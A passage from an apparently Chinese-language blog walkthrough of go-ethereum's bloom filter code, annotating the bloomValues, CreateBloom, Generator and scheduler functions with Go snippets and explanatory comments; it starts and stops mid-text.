<code>bloomValues</code>，他会选出 3 个字节，设置它们的值。</p><p>首先，选取索引为 1，3，5 的位置的字节，然后与 0000 0111 相与。假如索引为 1 的字节为 10110101，那么 1011 0101 &amp; 0000 0111=0000 0101 也就是选择后三位的值。然后将 1 移 5 位，也即为 0010 0000。这样就将某个字节的 8 位中的某一位设置成 1。</p><p>接着来选择这个字节所在的位置，将哈希值的末尾和 0111 1111 1111 相与，然后按照大端的方式，将这末尾的 16 位 转换成 uint16 的值，接着向做左移动 3 位，这样 最大为 FF=255，这样恰好在布隆过滤器的长度范围内。</p><p>这样，通过字节内的移位和选择字节的位置，我们就巧妙地伪随机地将 2048 位中的三个 bit 设置为 1。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bloomValues returns the bytes (index-value pairs) to set for the given data</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bloomValues</span><span class="params">(data []<span class="type">byte</span>, hashbuf []<span class="type">byte</span>)</span></span> (<span class="type">uint</span>, <span class="type">byte</span>, <span class="type">uint</span>, <span class="type">byte</span>, <span class="type">uint</span>, <span class="type">byte</span>) &#123;</span><br><span class="line">sha := hasherPool.Get().(crypto.KeccakState) <span class="comment">//选择 keccak-256 的哈希算法</span></span><br><span class="line"><span class="comment">//哈希函数的用法，重置缓冲区、写入需要哈希的数据、读取需要哈希的数据</span></span><br><span class="line">sha.Reset()</span><br><span class="line">sha.Write(data)</span><br><span class="line">sha.Read(hashbuf)</span><br><span class="line">hasherPool.Put(sha)</span><br><span class="line"><span class="comment">// The actual bits to flip</span></span><br><span class="line"><span class="comment">//选取索引为 1，3，5 的位置的字节，然后与0000 0111相与。</span></span><br><span class="line"><span class="comment">//假如索引为 1 的字节为 10110101，那么 1011 0101 &amp; 0000 0111=0000 0101 也就是选择后三位的值。</span></span><br><span class="line"><span class="comment">//然后将 1 移 5位，也即为 0010 0000</span></span><br><span class="line">v1 := <span class="type">byte</span>(<span class="number">1</span> &lt;&lt; (hashbuf[<span class="number">1</span>] &amp; <span class="number">0x7</span>))</span><br><span class="line">v2 := <span class="type">byte</span>(<span class="number">1</span> &lt;&lt; (hashbuf[<span class="number">3</span>] &amp; <span class="number">0x7</span>))</span><br><span class="line">v3 := <span class="type">byte</span>(<span class="number">1</span> &lt;&lt; (hashbuf[<span class="number">5</span>] &amp; <span class="number">0x7</span>))</span><br><span class="line"><span class="comment">// The indices for the bytes to OR in</span></span><br><span class="line"><span class="comment">//将哈希值的末尾和 0111 1111 1111 相与，然后按照大端的方式，将这末尾的 16 位 转换成 uint16 的值，</span></span><br><span class="line"><span class="comment">//接着向做左移动 3 位，这样 最大为FF=255，这样恰好在布隆过滤器的长度范围内。</span></span><br><span class="line">i1 := BloomByteLength - <span class="type">uint</span>((binary.BigEndian.Uint16(hashbuf)&amp;<span class="number">0x7ff</span>)&gt;&gt;<span class="number">3</span>) - <span class="number">1</span></span><br><span class="line">i2 := BloomByteLength - <span class="type">uint</span>((binary.BigEndian.Uint16(hashbuf[<span class="number">2</span>:])&amp;<span class="number">0x7ff</span>)&gt;&gt;<span class="number">3</span>) - <span class="number">1</span></span><br><span class="line">i3 := BloomByteLength - <span class="type">uint</span>((binary.BigEndian.Uint16(hashbuf[<span class="number">4</span>:])&amp;<span class="number">0x7ff</span>)&gt;&gt;<span class="number">3</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i1, v1, i2, v2, i3, v3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查元素">检查元素</h4><p>源码中设置了检查某个元素是否在布隆过滤器中的方法，简单的比较是否对应的字节内的序列相同。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test checks if the given topic is present in the bloom filter</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b Bloom)</span></span> Test(topic []<span class="type">byte</span>) <span class="type">bool</span> &#123;</span><br><span class="line">i1, v1, i2, v2, i3, v3 := bloomValues(topic, <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">6</span>))</span><br><span class="line"><span class="keyword">return</span> v1 == v1&amp;b[i1] &amp;&amp;</span><br><span class="line">v2 == v2&amp;b[i2] &amp;&amp;</span><br><span class="line">v3 == v3&amp;b[i3]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="设置布隆过滤器">设置布隆过滤器</h4><p>可以看出来，布隆过滤器以相同的方式，记录触发日志的合约的地址和日志数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreateBloom creates a bloom filter out of the give Receipts (+Logs)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CreateBloom</span><span class="params">(receipts Receipts)</span></span> Bloom &#123;</span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">6</span>) <span class="comment">//因为哈希后的数据只需要前面 6 个字节</span></span><br><span class="line"><span class="keyword">var</span> bin Bloom</span><br><span class="line"><span class="keyword">for</span> _, receipt := <span class="keyword">range</span> receipts &#123;</span><br><span class="line"><span class="keyword">for</span> _, log := <span class="keyword">range</span> receipt.Logs &#123;</span><br><span class="line">bin.add(log.Address.Bytes(), buf) <span class="comment">//添加日志地址</span></span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> log.Topics &#123;</span><br><span class="line">bin.add(b[:], buf) <span class="comment">//添加日志</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bin</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// LogsBloom returns the bloom bytes for the given logs</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LogsBloom</span><span class="params">(logs []*Log)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">6</span>)</span><br><span class="line"><span class="keyword">var</span> bin Bloom</span><br><span class="line"><span class="keyword">for</span> _, log := <span class="keyword">range</span> logs &#123;</span><br><span class="line">bin.add(log.Address.Bytes(), buf)</span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> log.Topics &#123;</span><br><span class="line">bin.add(b[:], buf)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> bin[:]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="core-bloombits-generator-go"><code>core/bloombits/generator.go</code></h3><p>geth 中布隆过滤器的实现分成了三个文件， generator 生成布隆过滤器，matcher 用来匹配查询操作，scheduler 用于调度对单个 bit 值检索进行。</p><h4 id="Generator-的定义">Generator 的定义</h4><p>首先需要注意：<strong>查询和聚合 bloom 的操作并不是以一个区块为最小单位，而是以 section 为最小单位，也就是 4096 个区块</strong>。然后，每个 section 的布隆过滤器会聚合在一起，构成 <code>Generator</code> 的结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generator takes a number of bloom filters and generates the rotated bloom bits</span></span><br><span class="line"><span class="comment">// to be used for batched filtering.</span></span><br><span class="line"><span class="keyword">type</span> Generator <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//转置后的 bloom 数据，实际上为 2048*(sections/8) 的矩阵</span></span><br><span class="line">blooms [types.BloomBitLength][]<span class="type">byte</span> <span class="comment">// Rotated blooms for per-bit matching</span></span><br><span class="line"><span class="comment">//段的个数，也是布隆过滤器的个数</span></span><br><span class="line">sections <span class="type">uint</span> <span class="comment">// Number of sections to batch together</span></span><br><span class="line"><span class="comment">//当前批量处理中的下一个将处理的段，也就是下一个 bloom</span></span><br><span class="line">nextSec <span class="type">uint</span> <span class="comment">// Next section to set when adding a bloom</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个<strong>需要注意的地方：</strong><code>blooms [types.BloomBitLength][]byte</code> 究竟是什么。它是多个 bloom 聚合在一起的集合，但是他的组织形式做了调整。这里，许多博客都有错误，比较让人误解。</p><p>在布隆过滤器的定义中，我们知道只有 3 个位置置为 1，如果挨个区块的检索，那么不断切换区块再通过哈希计算得到这三个位置，效率不高。因此，多个 bloom 聚合的<strong>矩阵进行了转置</strong>。这样检索的时候首先计算三个哈希后的位置 <code>i</code>, <code>j</code>, <code>k</code>，然后直接检索 4096 个区块的中<code>i</code> 位置是否为 1，进行第一轮排除，其他依次进行。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">原矩阵：</span><br><span class="line">[A0, A1, ..., A2047]</span><br><span class="line">[B0, B1, ..., B2047]</span><br><span class="line">...</span><br><span class="line">[H0, H1, ..., H2047]</span><br><span class="line">转置后：</span><br><span class="line">[A0, B0, ..., H0]</span><br><span class="line">[A1, B1, ..., H1]</span><br><span class="line">...</span><br><span class="line">[A2047, B2047, ..., H2047]</span><br></pre></td></tr></table></figure><p>原矩阵中的 0 到 2048 是一个 section 的布隆过滤器，然后多行是多个 section 的布隆过滤器。转置之后，第一列是第一个 section 的布隆过滤器，第一行表示是矩阵中的所有 sections 的索引为 0 的比特向量。其他的以此类推。</p><p><code>sections</code> 表示这个矩阵中有多少个 section，也就是多少个布隆过滤器。<code>nextSec</code> 表示下一个 section，也就是在添加 bloom 进矩阵时将要处理的 section。它相当于一个计数器，等于 <code>sections</code> 时表示完成了所有的添加操作。</p><h4 id="新建-Generator">新建 Generator</h4><p>上面的理论介绍在代码中的实现略有技巧，首先转置后 <code>blooms</code> 有 2048 行是显然的，然后它的列的设置是以字节为单位的，一个字节有八位，可以存储 8 个 bloom 的比特向量在某个索引的值。因此，我们需要 <code>sections</code> 是 8 的倍数，恰好填满字节数组，同时字节数组的长度只要是 <code>sections</code> 的八分之一即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewGenerator creates a rotated bloom generator that can iteratively fill a</span></span><br><span class="line"><span class="comment">// batched bloom filter&#x27;s bits.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGenerator</span><span class="params">(sections <span class="type">uint</span>)</span></span> (*Generator, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="comment">//段的数量需要是 8 的倍数，这样可以恰好按比特填充到字节数组里。</span></span><br><span class="line">   <span class="keyword">if</span> sections%<span class="number">8</span> != <span class="number">0</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;section count not multiple of 8&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   b := &amp;Generator&#123;sections: sections&#125;</span><br><span class="line">   <span class="comment">//请注意转置矩阵。这里因为一个字节占 8 位，而这里使用 byte 数组，因此只要占 1/8 的位置</span></span><br><span class="line">   <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; types.BloomBitLength; i++ &#123;</span><br><span class="line">      b.blooms[i] = <span class="built_in">make</span>([]<span class="type">byte</span>, sections/<span class="number">8</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> b, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="添加-bloom-进-Generator">添加 bloom 进 Generator</h4><p>理解了 <code>Generator</code> 的数据结构后就轻松了，为了在字节数组中添加 bloom 的二进制序列，首先要找到在字节数组中的哪个索引，然后找到字节中需要置位的比特的索引。接着，八位一组的将对应位置设置为 1。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AddBloom takes a single bloom filter and sets the corresponding bit column</span></span><br><span class="line"><span class="comment">// in memory accordingly.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Generator)</span></span> AddBloom(index <span class="type">uint</span>, bloom types.Bloom) <span class="type">error</span> &#123;</span><br><span class="line">   <span class="comment">// Make sure we&#x27;re not adding more bloom filters than our capacity</span></span><br><span class="line">   <span class="keyword">if</span> b.nextSec &gt;= b.sections &#123;</span><br><span class="line">      <span class="comment">//超过了设定的批量处理的段的个数</span></span><br><span class="line">      <span class="keyword">return</span> errSectionOutOfBounds</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//index 与下个将处理的段对应</span></span><br><span class="line">   <span class="keyword">if</span> b.nextSec != index &#123;</span><br><span class="line">      <span class="keyword">return</span> errors.New(<span class="string">&quot;bloom filter with unexpected index&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Rotate the bloom and insert into our collection</span></span><br><span class="line">   byteIndex := b.nextSec / <span class="number">8</span> <span class="comment">//根据下一个 section 的编号找到字节数组中的索引</span></span><br><span class="line">   <span class="comment">//在一个字节中的比特的索引，注意一个字节中存有 8 sections 的</span></span><br><span class="line">   <span class="comment">// bloom 的比特向量的某一位</span></span><br><span class="line">   bitIndex := <span class="type">byte</span>(<span class="number">7</span> - b.nextSec%<span class="number">8</span>)</span><br><span class="line">   <span class="comment">//开始初始化 每一列对应的 bloom</span></span><br><span class="line">   <span class="keyword">for</span> byt := <span class="number">0</span>; byt &lt; types.BloomByteLength; byt++ &#123;</span><br><span class="line">      <span class="comment">//八位一组，大端序</span></span><br><span class="line">      bloomByte := bloom[types.BloomByteLength<span class="number">-1</span>-byt]</span><br><span class="line">      <span class="keyword">if</span> bloomByte == <span class="number">0</span> &#123;</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">      &#125;</span><br><span class="line">      base := <span class="number">8</span> * byt</span><br><span class="line">      b.blooms[base+<span class="number">7</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">7</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">6</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">5</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">4</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">3</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">3</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">2</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base+<span class="number">1</span>][byteIndex] |= ((bloomByte &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">      b.blooms[base][byteIndex] |= (bloomByte &amp; <span class="number">1</span>) &lt;&lt; bitIndex</span><br><span class="line">   &#125;</span><br><span class="line">   b.nextSec++</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，有一个检索的函数，用于返回 blooms 的某一行，注意这不是一个布隆过滤器，而是连续的若干个 section 对应的 bloom 的索引为 <code>idx</code> 构成的集合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bitset returns the bit vector belonging to the given bit index after all</span></span><br><span class="line"><span class="comment">// blooms have been added.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Generator)</span></span> Bitset(idx <span class="type">uint</span>) ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">   <span class="comment">//因为 nextSec 递增，可以表示是否完成了给 Generator 的赋值</span></span><br><span class="line">   <span class="keyword">if</span> b.nextSec != b.sections &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;bloom not fully generated yet&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> idx &gt;= types.BloomBitLength &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, errBloomBitOutOfBounds</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> b.blooms[idx], <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="core-bloom-bits-sheduler-go"><code>core/bloom bits/sheduler.go</code></h3><p>sheduler 主要是用于调度检索任务，是检索任务的调度器，也可以删除重复数据、缓存结果，降低 IO 消耗。</p><h4 id="数据结构定义">数据结构定义</h4><p>以太坊的布隆过滤器总共有 2048 位，以太坊会把若干个区块分成段，段作为检索的基本单位，4096 个区块为一段。checkpoint 和 时间检索也是这样。下面是一个检索请求，表示在特定的一段 section 中匹配 2048 位的过滤器中的哪一位。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// request represents a bloom retrieval task to prioritize and pull from the local</span></span><br><span class="line"><span class="comment">// database or remotely from the network.</span></span><br><span class="line"><span class="keyword">type</span> request <span class="keyword">struct</span> &#123;</span><br><span class="line">section <span class="type">uint64</span> <span class="comment">// Section index to retrieve the a bit-vector from</span></span><br><span class="line">bit     <span class="type">uint</span>   <span class="comment">// Bit index within the section to retrieve the vector of</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>response 和上面的 request 对应，注意<strong>一段对应一个 response，检索任务以段(section) 为最小单位，而不是区块高度</strong>，表示被检索的 bit 向量的状态（即请求的状态）。cached 缓存检索结果，用于去重。done 表示请求是否完成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// response represents the state of a requested bit-vector through a scheduler.</span></span><br><span class="line"><span class="keyword">type</span> response <span class="keyword">struct</span> &#123;</span><br><span class="line">   cached []<span class="type">byte</span>        <span class="comment">// Cached bits to dedup multiple requests</span></span><br><span class="line">   done   <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125; <span class="comment">// Channel to allow waiting for completion</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调度器的定义如下：scheduler 是查询某一段区块的布隆过滤器的 bit 向量中某一位的任务调度器。bit 表示查询 2048 位中哪一位；response 表示这个某个请求结构，一般而言会包含所在的一段，有 4096 个 请求结果 的键值对。在调度的同时，scheduler 会实现去重和缓存结果的功能。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scheduler handles the scheduling of bloom-filter retrieval operations for</span></span><br><span class="line"><span class="comment">// entire section-batches belonging to a single bloom bit. Beside scheduling the</span></span><br><span class="line"><span class="comment">// retrieval operations, this struct also deduplicates the requests and caches</span></span><br><span class="line"><span class="comment">// the results to minimize network/database overhead even in complex filtering</span></span><br><span class="line"><span class="comment">// scenarios.</span></span><br><span class="line"><span class="keyword">type</span> scheduler <span class="keyword">struct</span> &#123;</span><br><span class="line">   bit       <span class="type">uint</span>                 <span class="comment">// Index of the bit in the bloom filter this scheduler is responsible for</span></span><br><span class="line">   responses <span class="keyword">map</span>[<span class="type">uint64</span>]*response <span class="comment">// Currently pending retrieval requests or already cached responses</span></span><br><span class="line">   lock      sync.Mutex           <span class="comment">// Lock protecting the responses from concurrent access</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行调度任务">执行调度任务</h4><p>接下来看如何执行调度操作，这需要了解 Golang 的并发。 <code>run</code> 函数开始执行流水线式的调度任务，并且会返回结果。</p><ul><li><code>sections chan uint64</code> 表示调度任务属于哪一段。</li><li><code>dist chan *request</code> 表示调度的输入，输入可以是本地的检索请求，可以是来自网络的检索请求。</li><li><code>done chan []byte</code> 表示输出的结果，用字节数组表示。</li><li><code> quit chan struct&#123;&#125;</code> 是空结构体，通过阻塞控制，表示调度任务是否完成。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// run creates a retrieval pipeline, receiving section indexes from sections and</span></span><br><span class="line"><span class="comment">// returning the results in the same order through the done channel. Concurrent</span></span><br><span class="line"><span class="comment">// runs of the same scheduler are allowed, leading to retrieval task deduplication.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *scheduler)</span></span> run(sections <span class="keyword">chan</span> <span class="type">uint64</span>, dist <span class="keyword">chan</span> *request, done <span class="keyword">chan</span> []<span class="type">byte</span>, quit <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, wg *sync.WaitGroup) &#123;</span><br><span class="line">   <span class="comment">//请求和回应之间的缓冲通道，用于阻塞和控制。</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Create a forwarder channel between requests and responses of the same size as</span></span><br><span class="line">   <span class="comment">// the distribution channel (since that will block the pipeline anyway).</span></span><br><span class="line">   pend := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">uint64</span>, <span class="built_in">cap</span>(dist))</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Start the pipeline schedulers to forward between user -&gt; distributor -&gt; user</span></span><br><span class="line">   wg.Add(<span class="number">2</span>)</span><br><span class="line">   <span class="keyword">go</span> s.scheduleRequests(sections, dist, pend, quit, wg)</span><br><span class="line">   <span class="keyword">go</span> s.scheduleDeliveries(pend, done, quit, wg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先 <code>pend</code> 变量是用作阻塞控制的中间变量，它可以控制 <code>request</code> 和 <code>response</code> 的协调调度。这里再次强调，调度器可以接受外部的请求，会并发地同时处理网络地检索请求和用户自身的检索请求。</p><p><code>scheduleRequests</code> 方法主要是将调度器检索的段 <code>reqs chan uint64</code> ，封装到 <code>dist chan *request </code>，然后初始化 <code>response</code>。<code>pend</code> 将会接收 <code>reqs chan uint64</code> 的值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scheduleRequests reads section retrieval requests from the input channel,</span></span><br><span class="line"><span class="comment">// deduplicates the stream and pushes unique retrieval tasks into the distribution</span></span><br><span class="line"><span class="comment">// channel for a database or network layer to honour.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *scheduler)</span></span> scheduleRequests(reqs <span class="keyword">chan</span> <span class="type">uint64</span>, dist <span class="keyword">chan</span> *request, pend <span class="keyword">chan</span> <span class="type">uint64</span>, quit <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, wg *sync.WaitGroup) &#123;</span><br><span class="line"><span class="comment">// Clean up the goroutine and pipeline when done</span></span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(pend)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep reading and scheduling section requests</span></span><br><span class="line"><span class="comment">//一直将 section 封装到 requests，直到收到 quit 信号</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-quit: <span class="comment">//收到退出信号就返回</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> section, ok := &lt;-reqs:</span><br><span class="line"><span class="comment">//如果没有收到退出信号，继续初始化 responses，</span></span><br><span class="line"><span class="comment">//将封装了段高度的请求传入 dist，再把 段高度传入 pend</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// New section retrieval requested</span></span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Deduplicate retrieval requests</span></span><br><span class="line">unique := <span class="literal">false</span> <span class="comment">//因为并发执行时可能一已经进入了协程，这里用于去重</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//阻塞其他协程，直到这一部分完成，Unlock</span></span><br><span class="line">s.lock.Lock()</span><br><span class="line"><span class="comment">//如果请求为空，那么设置为已完成，避免重复执行</span></span><br><span class="line"><span class="keyword">if</span> s.responses[section] == <span class="literal">nil</span> &#123;</span><br><span class="line">s.responses[section] = &amp;response&#123;</span><br><span class="line">done: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">unique = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">s.lock.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Schedule the section for retrieval and notify the deliverer to expect this section</span></span><br><span class="line"><span class="keyword">if</span> 